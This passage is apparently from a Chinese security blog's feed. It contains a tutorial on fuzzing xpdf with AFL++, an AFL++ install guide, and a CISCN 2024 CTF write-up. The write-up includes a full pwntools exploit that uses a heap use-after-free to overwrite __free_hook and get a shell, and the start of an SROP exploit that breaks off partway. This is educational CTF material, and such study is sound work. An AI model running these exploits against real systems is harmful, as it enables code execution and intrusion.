routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd 你的路径/xpdf-3.02<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><br><span class="hljs-attribute">CC</span>=<span class="hljs-variable">$HOME</span>/AFLplusplus/afl-clang-fast <span class="hljs-attribute">CXX</span>=<span class="hljs-variable">$HOME</span>/AFLplusplus/afl-clang-fast++ ./configure <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/&quot;</span><br><span class="hljs-comment">#其中的CC和CXX意思是指定c和c++的编译器分别为afl-clang-fast和afl-clang-fast++</span><br><br>make<br>make install<br></code></pre></td></tr></table></figure><p>编译完成后使用afl-fuzz开始编译</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs swift">afl<span class="hljs-operator">-</span>fuzz <span class="hljs-operator">-</span>i 你的路径<span class="hljs-regexp">/pdf_examples/</span> <span class="hljs-operator">-</span>o 你指定的输出<span class="hljs-regexp">/out/</span> <span class="hljs-operator">-</span>s <span class="hljs-number">123</span> <span class="hljs-operator">--</span> 你的路径<span class="hljs-regexp">/install/</span>bin<span class="hljs-regexp">/pdftotext @@ 你的路径/</span>output<br><br><span class="hljs-operator">-</span>i 表示我们必须放置输入用例的目录（又称文件示例）<br><span class="hljs-operator">-</span>o 表示 <span class="hljs-type">AFL</span><span class="hljs-operator">++</span> 存储突变文件的目录<br><span class="hljs-operator">-</span>s 表示要使用的静态随机种子<br>@<span class="hljs-meta">@是占位符目标的命令行，AFL</span> 将用每个输入文件名替换该命令行<br><br></code></pre></td></tr></table></figure><img src="/2024/07/01/fuzzing101-01/2.png" class=""><p>​当看到saved crashes :有记录时就可以ctrl+c退出查看crash了，之后便是调试查看是什么问题了(由于我是已经跑完了再写的blog，所以忘记截图了，这里用下fuzzing101中的截图)</p><h2 id="调试查看结果"><a href="#调试查看结果" class="headerlink" title="调试查看结果"></a>调试查看结果</h2><p>重新编译程序</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">你的路径/xpdf-<span class="hljs-number">3.02</span>/<br>make clean<br><span class="hljs-attribute">CFLAGS</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span> CXXFLAGS<span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span><br>make<br></code></pre></td></tr></table></figure><p>开始调试</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gdb</span> --args install/bin/pdftotext out/default/crashes/id:<span class="hljs-number">000000</span>,sig:<span class="hljs-number">11</span>,src:<span class="hljs-number">000703</span>,time:<span class="hljs-number">4193216</span>,execs:<span class="hljs-number">1820460</span>,op:havoc,rep:<span class="hljs-number">5</span> output<br></code></pre></td></tr></table></figure><img src="/2024/07/01/fuzzing101-01/3.png" class=""><p>发现原因是因为一直在循环</p><h2 id="强化训练"><a href="#强化训练" class="headerlink" title="强化训练"></a>强化训练</h2><p>来看看高版本的xpdf是否能成功fuzz</p><p>前面通用的操作，只不过这里不同的地方是4.04版本的xpdf不是configure来编译配置了，取而代之的则是cmake</p><img src="/2024/07/01/fuzzing101-01/4.png" class=""><img src="/2024/07/01/fuzzing101-01/5.png" class=""><p>配置指令为</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cmake <span class="hljs-attribute">-DCMAKE_BUILD_TYPE</span>=Release <span class="hljs-attribute">-DCMAKE_C_FLAGS</span>=<span class="hljs-string">&quot;-fsanitize=address -g&quot;</span> <span class="hljs-attribute">-DCMAKE_CXX_FLAGS</span>=<span class="hljs-string">&quot;-fsanitize=address -g&quot;</span> <span class="hljs-attribute">-DCMAKE_INSTALL_PREFIX</span>=<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/<br><br><span class="hljs-comment">#-DCMAKE_BUILD_TYPE=Release: 这个选项设置了构建类型为 Release，通常意味着会启用优化，同时可能会包含一些限制性的调试符号。</span><br><br><span class="hljs-comment">#-DCMAKE_C_FLAGS=&quot;-fsanitize=address -g&quot;: 这个选项设置了 C 语言文件的编译选项。-fsanitize=address 启用了 AddressSanitizer，用于在运行时检测内存错误（比如使用已释放的内存或者越界访问）。-g 选项则在编译后的二进制文件中包含调试符号。(这里和AFL_USE_ASAN还是有点区别的，一个是用于构建环境，另一个是用于模糊测试，并不只用作用于构建环境)</span><br></code></pre></td></tr></table></figure><p>当然，想要用afl进行插桩编译时配置命令则要加上afl的c和c++的编译器</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><br>cmake <span class="hljs-attribute">-DCMAKE_BUILD_TYPE</span>=Debug /home/pw/fuzzing_xpdf/xpdf-4.04 <span class="hljs-attribute">-DCMAKE_INSTALL_PREFIX</span>=<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/ <span class="hljs-attribute">-DCMAKE_C_FLAGS</span>=<span class="hljs-string">&quot;-fsanitize=address -g&quot;</span> <span class="hljs-attribute">-DCMAKE_CXX_FLAGS</span>=<span class="hljs-string">&quot;-fsanitize=address -g&quot;</span> <span class="hljs-attribute">-DCMAKE_CXX_COMPILER</span>=/home/fuzz_tools/AFLplusplus/afl-clang-fast++ -DCMAKE_CC_COMPIL<br><span class="hljs-attribute">ER</span>=/home/fuzz_tools/AFLplusplus/afl-clang-fast<br><span class="hljs-comment">#记得看下自己的路径</span><br><br><span class="hljs-attribute">AFL_USE_ASAN</span>=1 make<br>sudo <span class="hljs-attribute">AFL_USE_ASAN</span>=1 make install<br><span class="hljs-comment">#AFL_USE_ASAN=1 是一个环境变量设置，用于在编译过程中启用 AddressSanitizer (ASAN) 与 American Fuzzy Lop (AFL) 结合使用。其主要作用是检测内存错误，如缓冲区溢出、未初始化内存使用、内存泄漏等。</span><br><br></code></pre></td></tr></table></figure><p>启动fuzz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">afl-fuzz -i <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/pdf_examples/ -o <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/out/ -s 123 -- <span class="hljs-variable">$HOME</span>/xpdf_4.04/xpdf/pdftotext @@ <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/output<br></code></pre></td></tr></table></figure><img src="/2024/07/01/fuzzing101-01/6.png" class=""><p>刷了会视频就跑出一个crash，赶紧调试看看，调试发现可能因为错误的输入，导致realloc没有分配到地址，最后进入报错函数，总结没用，但还是学废了一点点东西</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>AFL++安装</title>
    <link href="/2024/07/01/AFL++%E5%AE%89%E8%A3%85/"/>
    <url>/2024/07/01/AFL++%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h1 id="AFL-安装"><a href="#AFL-安装" class="headerlink" title="AFL++安装"></a><center>AFL++安装</h1><p>安装依赖项</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> update<br>sudo apt-<span class="hljs-built_in">get</span> install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools<br>sudo apt-<span class="hljs-built_in">get</span> install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo apt-<span class="hljs-built_in">get</span> install -y lld llvm llvm-dev clang <br>sudo apt-<span class="hljs-built_in">get</span> install -y gcc-$(gcc --version|head -n1|sed <span class="hljs-string">&#x27;s/.* //&#x27;</span>|sed <span class="hljs-string">&#x27;s/\..*//&#x27;</span>)-plugin-dev libstdc++-$(gcc --version|head -n1|sed <span class="hljs-string">&#x27;s/.* //&#x27;</span>|sed <span class="hljs-string">&#x27;s/\..*//&#x27;</span>)-dev<br></code></pre></td></tr></table></figure><p>编译安装AFL++(编译项目时间很长请耐心等待)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span><br>git <span class="hljs-built_in">clone</span> https://github.com/AFLplusplus/AFLplusplus &amp;&amp; <span class="hljs-built_in">cd</span> AFLplusplus<br><br><span class="hljs-built_in">export</span> LLVM_CONFIG=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-comment">#在当前终端中指定LLVM_CONFIG环境</span><br>sudo make distrib<br><span class="hljs-comment">#编译项目</span><br>sudo make install<br><span class="hljs-comment">#安装项目</span><br></code></pre></td></tr></table></figure><p>安装后输入afl-fuzz，出现以下内容即安装成功</p><img src="/2024/07/01/AFL++%E5%AE%89%E8%A3%85/1.png" class="">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2024华中CISCN</title>
    <link href="/2024/06/24/%E5%8D%8E%E4%B8%ADciscn/"/>
    <url>/2024/06/24/%E5%8D%8E%E4%B8%ADciscn/</url>
    
    <content type="html"><![CDATA[<h1 id="2024华中-ciscn"><a href="#2024华中-ciscn" class="headerlink" title="2024华中-ciscn"></a><center>2024华中-ciscn</h1><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p>菜单堆题，漏洞点uaf，2.31的堆，泄露libc打free_hook</p><img src="/2024/06/24/%E5%8D%8E%E4%B8%ADciscn/1.png" class=""><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-comment">#import ctf_pb2</span><br><br>c = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># srop :    frame = SigreturnFrame()</span><br><span class="hljs-comment"># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)</span><br><br>s    =    <span class="hljs-keyword">lambda</span> a              :pw.send(a)<br>sl   =    <span class="hljs-keyword">lambda</span> a              :pw.sendline(a)<br>sa   =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendafter(a,b)<br>sla  =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendlineafter(a,b)<br>r    =    <span class="hljs-keyword">lambda</span> a=<span class="hljs-number">6666</span>         :pw.recv(a)<br>rl   =    <span class="hljs-keyword">lambda</span>                :pw.recvline()<br>ru   =    <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-literal">True</span>       :pw.recvuntil(a,b)<br>g64  =    <span class="hljs-keyword">lambda</span>                :u64(pw.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>g32  =    <span class="hljs-keyword">lambda</span>                :u32(pw.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gl   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recvuntil(a,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gc   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>pwpw =    <span class="hljs-keyword">lambda</span>                :pw.interactive()<br>lss  =    <span class="hljs-keyword">lambda</span> s :log.success(<span class="hljs-string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>cal  =    <span class="hljs-keyword">lambda</span> a,b            :((a - b) + <span class="hljs-number">0x10000</span>) % <span class="hljs-number">0x10000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sb</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>():<br>    libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts)<br>    libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>    system = libc.dump(<span class="hljs-string">&quot;system&quot;</span>) + libc_base<br>    binsh = libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>) + libc_base<br>    <span class="hljs-keyword">return</span> system,binsh<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">a=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> a !=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(pw,a) <br>        pause()<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(pw)  <br>        pause()<br>    <br><span class="hljs-comment"># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="hljs-comment"># context.arch=&#x27;i386&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>file = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(file)<br>libc = ELF(<span class="hljs-string">&#x27;/home/pw/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc-2.31.so&#x27;</span>)    <br><span class="hljs-comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">0</span>:<br>    pw = process(file)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    pw = remote(<span class="hljs-string">&quot;39.106.48.123&quot;</span>,<span class="hljs-number">36592</span>)<br><br><span class="hljs-comment">#----------------------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,text</span>):<br>    sla(<span class="hljs-string">b&#x27;exit&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,text)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,text</span>):<br>    sla(<span class="hljs-string">b&#x27;exit&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">b&#x27;: &#x27;</span>,text)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">b&#x27;exit&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">b&#x27;exit&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x410</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br><span class="hljs-comment"># dbg()</span><br>free(<span class="hljs-number">0</span>)<br><br>show(<span class="hljs-number">0</span>)<br><br>ru(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>libc_base = u64(pw.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x1ecbe0</span><br>lss(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x30</span>,p64(free_hook))<br><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,p64(libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><br>free(<span class="hljs-number">3</span>)<br><br><span class="hljs-comment"># dbg()</span><br>pwpw()<br></code></pre></td></tr></table></figure><h2 id="go-note"><a href="#go-note" class="headerlink" title="go_note"></a>go_note</h2><p>go语言经典栈溢出，由于是静态文件，没有直接的rdi和rsi的pop，但是rax可控且有syscall，直接打srop</p><img src="/2024/06/24/%E5%8D%8E%E4%B8%ADciscn/2.png" class=""><img src="/2024/06/24/%E5%8D%8E%E4%B8%ADciscn/3.png" class=""><p>exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-comment">#import ctf_pb2</span><br><br>c = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># srop :    frame = SigreturnFrame()</span><br><span class="hljs-comment"># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)</span><br><br>s    =    <span class="hljs-keyword">lambda</span> a              :pw.send(a)<br>sl   =    <span class="hljs-keyword">lambda</span> a              :pw.sendline(a)<br>sa   =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendafter(a,b)<br>sla  =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendlineafter(a,b)<br>r    =    <span class="hljs-keyword">lambda</span> a=<span class="hljs-number">6666</span>         :pw.recv(a)<br>rl   =    <span class="hljs-keyword">lambda</span>                :pw.recvline()<br>ru   =    <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-literal">True</span>       :pw.recvuntil(a,b)<br>g64  =    <span class="hljs-keyword">lambda</span>                :u64(pw.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>g32  =    <span class="hljs-keyword">lambda</span>                :u32(pw.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gl   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recvuntil(a,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gc   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>pwpw =    <span class="hljs-keyword">lambda</span>                :pw.interactive()<br>lss  =    <span class="hljs-keyword">lambda</span> s :log.success(<span class="hljs-string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>cal  =    <span class="hljs-keyword">lambda</span> a,b            :((a - b) + <span class="hljs-number">0x10000</span>) % <span class="hljs-number">0x10000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sb</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>():<br>    libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts)<br>    libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>    system = libc.dump(<span class="hljs-string">&quot;system&quot;</span>) + libc_base<br>    binsh = libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>) + libc_base<br>    <span class="hljs-keyword">return</span> system,binsh<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">a=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> a !=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(pw,a) <br>        pause()<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(pw)  <br>        pause()<br>    <br><span class="hljs-comment"># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="hljs-comment"># context.arch=&#x27;i386&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>file = <span class="hljs-string">&#x27;./note&#x27;</span><br>elf = ELF(file)<br>libc 